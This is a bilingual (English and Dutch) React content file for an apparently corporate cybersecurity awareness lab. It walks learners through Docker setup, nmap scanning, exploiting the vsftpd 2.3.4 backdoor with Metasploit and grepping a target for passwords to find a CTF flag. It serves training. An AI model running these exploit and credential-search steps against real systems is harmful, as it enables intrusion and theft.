import React from 'react';
import { AppContent } from './types';
import { DockerDiagram, NetworkScanDiagram, ExploitDiagram } from './components/Visuals';

export const CONTENT: Record<'en' | 'nl', AppContent> = {
  en: {
    header: {
      title: "Cybersecurity Awareness Lab",
      subtitle: "Building Security Knowledge Through Safe, Hands-On Learning",
      badge: "ING Factory • ideas worth building"
    },
    challenges: [
      {
        id: 0,
        title: "Connection & Setup",
        difficulty: "BEGINNER",
        theory: {
          title: "The Virtual Environment",
          content: "We use **Docker** to create a safe, isolated playground. Think of Docker containers like shipping containers: they hold everything needed to run a computer system (the operating system, tools, files) in a neat package that runs anywhere.",
          analogy: "Imagine your computer is a large office building. Docker containers are like secure, soundproof meeting rooms inside that building. What happens inside the room stays in the room.",
          visual: <DockerDiagram />
        },
        realWorld: {
          title: "Containers in Action",
          description: "Modern tech giants like Netflix and Spotify use containers to serve millions of users.",
          scenario: "When you click 'Play' on Netflix, a container often spins up specifically to handle your streaming request, ensuring that your movie doesn't crash someone else's."
        },
        task: {
          title: "Connect to your Attack Machine",
          steps: [
            {
              label: "1. Open your terminal/command prompt and run:",
              command: "docker exec -it kali bash",
              context: "Host Terminal (Your Computer)"
            },
            {
              label: "2. Verify you see the root prompt:",
              output: "root@kali:~#",
              context: "Attacker: root@kali"
            }
          ]
        },
        hints: [
          {
            title: "What is Kali Linux?",
            type: "info",
            content: "Kali Linux is a digital toolbox packed with hundreds of pre-installed security tools. In this lab, it acts as your 'Attacker' machine."
          },
          {
            title: "How ING uses Docker",
            type: "ing",
            content: "ING uses containers (ICHP) to manage services. This allows for rapid deployment, scalability, and security isolation between banking services."
          }
        ]
      },
      {
        id: 1,
        title: "Network Discovery",
        difficulty: "BEGINNER",
        theory: {
          title: "Mapping the Territory",
          content: "Before a security professional can secure (or attack) a system, they must find it. **Network Scanning** is the process of identifying active devices and the services they offer. We check 'Ports'—digital doors that accept connections.",
          analogy: "Network scanning is like walking down a hallway in a hotel and checking which doors are open and who is inside. We use a tool called 'Nmap' (Network Mapper) to do this automatically.",
          visual: <NetworkScanDiagram />
        },
        realWorld: {
          title: "The Danger of Open Ports",
          description: "Unsecured open ports are one of the most common ways hackers enter a network.",
          scenario: "The WannaCry ransomware attack (2017) spread globally by scanning for open port 445 on Windows computers. It infected over 200,000 systems in 150 countries."
        },
        task: {
          title: "Scan for Vulnerabilities",
          steps: [
            {
              label: "1. First, find machines on the network (Ping Scan):",
              command: "nmap -sn 172.20.0.0/24",
              output: "Nmap scan report for badweb.demo (172.20.0.3)\nHost is up.",
              context: "Attacker: root@kali"
            },
            {
              label: "2. Scan the target for open ports and bugs:",
              command: "nmap -sV -p 1-100 --script vulners (IP Address you need to find)",
              output: "21/tcp open ftp vsftpd 2.3.4\n| vulners:\n| CVE-2011-2523",
              context: "Attacker: root@kali"
            }
          ]
        },
        hints: [
          {
            title: "What is Nmap?",
            type: "setup",
            content: "Nmap is the industry standard for network mapping. The flags we used: '-sn' (ping scan), '-sV' (detect service versions), and '--script vulners' (check against known bug databases)."
          },
          {
            title: "What did we find?",
            type: "solution",
            content: "We found a service called 'vsftpd 2.3.4' running on port 21. The scanner flagged it as having a 'CVE', which is a known security vulnerability."
          }
        ]
      },
      {
        id: 2,
        title: "Exploitation & Looting",
        difficulty: "INTERMEDIATE",
        theory: {
          title: "Breaking & Entering",
          content: "We found a **Backdoor** in the previous step. A backdoor is a secret way to bypass normal authentication. Once inside (Root access), the next phase is **Looting**: searching for sensitive files. These are often hidden to avoid detection.",
          analogy: "If the scanner told us the door was unlocked, Metasploit is the robot that actually turns the handle. 'Looting' is rummaging through drawers to find the keys.",
          visual: <ExploitDiagram />
        },
        realWorld: {
          title: "The Casino Fish Tank Hack",
          description: "Hackers can exploit the smallest device to get into a big network.",
          scenario: "In a famous incident, hackers entered a casino's network through a 'smart' thermometer in a fish tank. Once inside that weak device, they moved laterally to steal the high-roller database."
        },
        task: {
          title: "Gain Root & Hunt for Credentials",
          steps: [
            {
              label: "1. Launch Metasploit (The hacking framework):",
              command: "msfconsole",
              context: "Attacker: root@kali"
            },
            {
              label: "2. Search for the specific exploit module:",
              command: "search vsftpd",
              context: "Metasploit Console"
            },
            {
              label: "3. Configure and launch the attack:",
              command: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS (IP Address you need to find)\nexploit",
              context: "Metasploit Console"
            },
            {
              label: "4. You are root! The admin has hidden a file in `/home`. Use `find` to look for hidden files (starting with `.`) or `grep` to search for keywords. Try different combinations:",
              command: "# Option A: Find files by name\nfind /home -type f -name \"*\"\n\n# Option B: Search for text (e.g., 'password', 'key')\ngrep -r \"password\" /home",
              output: "(Review the output. Look for suspicious filenames or even partial file names)",
              context: "Target System (Root Shell)"
            },
            {
              label: "5. Once you locate the suspicious file, display its contents using 'cat' to reveal the Flag and the next Lab Clue:",
              command: "cat /home/socrates/.[FOUND_FILENAME]",
              output: "FLAG{Sm4rt_S3arch_Sk1lls_GG}\n\n[INFO] Congratulations! The next clue to the lab is within this file.",
              context: "Target System (Root Shell)"
            }
          ]
        },
        hints: [
          {
            title: "Linux Search Tools Explained",
            type: "command",
            content: "`find` looks for file names. Use `-name \".*\"` to see hidden files (dotfiles). `grep` searches for text *inside* files. The `-r` flag means 'recursive' (look in all subfolders). Try guessing keywords the admin might use!"
          },
          {
            title: "Understanding the Backdoor",
            type: "info",
            content: "The vsftpd 2.3.4 backdoor was a famous incident where a hacker planted malicious code in the source code of the software. Logging in with a smiley face :) triggered it."
          }
        ]
      }
    ],
    completion: {
      title: "Mission Accomplished!",
      badge: "Security Champion",
      learnedTitle: "What you've mastered:",
      learnedPoints: [
        "Network reconnaissance and service discovery",
        "Identifying Vulnerabilities (CVEs)",
        "Ethical Exploitation using Metasploit",
        "Advanced File System Search (Grep/Find)"
      ],
      applyTitle: "Apply this at ING:",
      applyPoints: [
        "Keep software updated to patch vulnerabilities",
        "Use strong, unique passwords",
        "Report suspicious activity to the Security Team"
      ]
    }
  },
  nl: {
    header: {
      title: "Cybersecurity Bewustzijn Lab",
      subtitle: "Veiligheidskennis Opbouwen Door Veilig, Hands-On Leren",
      badge: "ING Factory • ideeën die het waard zijn om te bouwen"
    },
    challenges: [
      {
        id: 0,
        title: "Verbinding & Setup",
        difficulty: "BEGINNER",
        theory: {
          title: "De Virtuele Omgeving",
          content: "We gebruiken **Docker** om een veilige, geïsoleerde speeltuin te creëren. Zie Docker-containers als zeecontainers: ze bevatten alles wat nodig is om een computersysteem te draaien in een net pakketje.",
          analogy: "Stel je computer voor als een groot kantoorgebouw. Docker-containers zijn veilige, geluiddichte vergaderruimtes in dat gebouw. Wat in de kamer gebeurt, blijft in de kamer.",
          visual: <DockerDiagram />
        },
        realWorld: {
          title: "Containers in Actie",
          description: "Techgiganten zoals Netflix gebruiken containers om miljoenen gebruikers te bedienen.",
          scenario: "Wanneer je op Netflix op 'Afspelen' klikt, start er vaak een container op speciaal voor jouw stream, zodat jouw film die van iemand anders niet laat crashen."
        },
        task: {
          title: "Verbind met je Aanvalsmachine",
          steps: [
            {
              label: "1. Open je terminal en voer uit:",
              command: "docker exec -it kali bash",
              context: "Host Terminal (Jouw Computer)"
            },
            {
              label: "2. Controleer of je de root prompt ziet:",
              output: "root@kali:~#",
              context: "Aanvaller: root@kali"
            }
          ]
        },
        hints: [
          {
            title: "Wat is Kali Linux?",
            type: "info",
            content: "Kali Linux is een digitale gereedschapskist vol met beveiligingstools. In dit lab fungeert het als je 'Aanvaller'-machine."
          },
          {
            title: "Hoe ING Docker gebruikt",
            type: "ing",
            content: "ING gebruikt containers (ICHP) om diensten te beheren. Dit zorgt voor snelle uitrol, schaalbaarheid en isolatie tussen bankdiensten."
          }
        ]
      },
      {
        id: 1,
        title: "Netwerk Ontdekking",
        difficulty: "BEGINNER",
        theory: {
          title: "Het Terrein Inkaart Brengen",
          content: "Voordat een beveiligingsprofessional een systeem kan beveiligen (of aanvallen), moet hij het vinden. **Netwerkscannen** is het proces van het identificeren van actieve apparaten.",
          analogy: "Netwerkscannen is als door een hotelgang lopen en kijken welke deuren open staan. We gebruiken een tool genaamd 'Nmap' om dit automatisch te doen.",
          visual: <NetworkScanDiagram />
        },
        realWorld: {
          title: "Het gevaar van open poorten",
          description: "Onbeveiligde open poorten zijn een veelvoorkomende toegangsweg voor hackers.",
          scenario: "De WannaCry ransomware-aanval (2017) verspreidde zich wereldwijd door te scannen naar open poort 445 op Windows-computers."
        },
        task: {
          title: "Scan op Kwetsbaarheden",
          steps: [
            {
              label: "1. Vind machines op het netwerk (Ping Scan):",
              command: "nmap -sn 172.20.0.0/24",
              output: "Nmap scan report for badweb.demo (172.20.0.3)\nHost is up.",
              context: "Aanvaller: root@kali"
            },
            {
              label: "2. Scan het doelwit op open poorten:",
              command: "nmap -sV -p 1-100 --script vulners (IP Address you need to find) ",
              output: "21/tcp open ftp vsftpd 2.3.4\n| vulners:\n| CVE-2011-2523",
              context: "Aanvaller: root@kali"
            }
          ]
        },
        hints: [
          {
            title: "Wat is Nmap?",
            type: "setup",
            content: "Nmap is de standaard voor netwerkmapping. We gebruikten '-sn' (ping scan) en '-sV' (versiedetectie)."
          },
          {
            title: "Wat hebben we gevonden?",
            type: "solution",
            content: "We vonden een dienst genaamd 'vsftpd 2.3.4' op poort 21. De scanner markeerde dit als een bekende kwetsbaarheid (CVE)."
          }
        ]
      },
      {
        id: 2,
        title: "Exploitatie & Buitmaken",
        difficulty: "INTERMEDIATE",
        theory: {
          title: "Inbreken",
          content: "We vonden een **Backdoor**. Een achterdeur is een geheime manier om authenticatie te omzeilen. Eenmaal binnen (Root toegang) is de volgende stap **Buitmaken**: zoeken naar gevoelige bestanden. Deze zijn vaak verborgen.",
          analogy: "Als de scanner ons vertelde dat de deur niet op slot was, is Metasploit de robot die de klink omlaag duwt. 'Buitmaken' is het doorzoeken van lades naar de sleutels.",
          visual: <ExploitDiagram />
        },
        realWorld: {
          title: "De Casino Vis Tank Hack",
          description: "Hackers kunnen via het kleinste apparaat een groot netwerk binnenkomen.",
          scenario: "In een beroemd incident kwamen hackers een casino binnen via een 'slimme' thermometer in een aquarium en stalen vervolgens de database met high-rollers."
        },
        task: {
          title: "Krijg Root Toegang & Zoek de Buit",
          steps: [
            {
              label: "1. Start Metasploit (Het hacking framework):",
              command: "msfconsole",
              context: "Aanvaller: root@kali"
            },
            {
              label: "2. Zoek de specifieke exploit module:",
              command: "search vsftpd",
              context: "Metasploit Console"
            },
            {
              label: "3. Configureer en start de aanval:",
              command: "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS (IP Address you need to find)\nexploit",
              context: "Metasploit Console"
            },
            {
              label: "4. Je bent root! De admin heeft een bestand verborgen in `/home`. Gebruik `find` voor verborgen bestanden (startend met `.`) of `grep` om naar tekst te zoeken. Probeer verschillende combinaties:",
              command: "# Optie A: Zoek bestanden\nfind /home -type f -name \"*\"\n\n# Optie B: Zoek naar tekst (bijv. 'password', 'key')\ngrep -r \"password\" /home",
              output: "(Bekijk de output goed. Zoek naar verdachte bestandsnamen!)",
              context: "Doelwit Systeem (Root Shell)"
            },
            {
              label: "5. Als je het verdachte bestand hebt gevonden, lees de inhoud met 'cat' om de Vlag en de volgende aanwijzing te vinden:",
              command: "cat /home/socrates/.[GEVONDEN_BESTANDSNAAM]",
              output: "FLAG{Sm4rt_S3arch_Sk1lls_GG}\n\n[INFO] Gefeliciteerd! De volgende aanwijzing voor het lab staat in dit bestand.",
              context: "Doelwit Systeem (Root Shell)"
            }
          ]
        },
        hints: [
          {
            title: "Linux Zoektools Uitgelegd",
            type: "command",
            content: "`find` zoekt op bestandsnaam. Gebruik `-name \".*\"` voor verborgen bestanden. `grep` zoekt naar tekst *in* bestanden. De `-r` vlag betekent 'recursief' (zoek in alle submappen). Probeer te raden welke woorden de admin gebruikt!"
          },
          {
            title: "De Backdoor Begrijpen",
            type: "info",
            content: "De vsftpd 2.3.4 backdoor was een beroemd incident waarbij hackers code in de software plantten. Inloggen met een smiley :) activeerde het."
          }
        ]
      }
    ],
    completion: {
      title: "Missie Volbracht!",
      badge: "Security Kampioen",
      learnedTitle: "Wat je hebt geleerd:",
      learnedPoints: [
        "Netwerkverkenning en service discovery",
        "Kwetsbaarheden identificeren (CVE's)",
        "Ethisch hacken met Metasploit",
        "Geavanceerd zoeken in bestandssystemen (Grep/Find)"
      ],
      applyTitle: "Pas dit toe bij ING:",
      applyPoints: [
        "Houd software up-to-date",
        "Gebruik sterke, unieke wachtwoorden",
        "Meld verdachte activiteiten bij het Security Team"
      ]
    }
  }
};
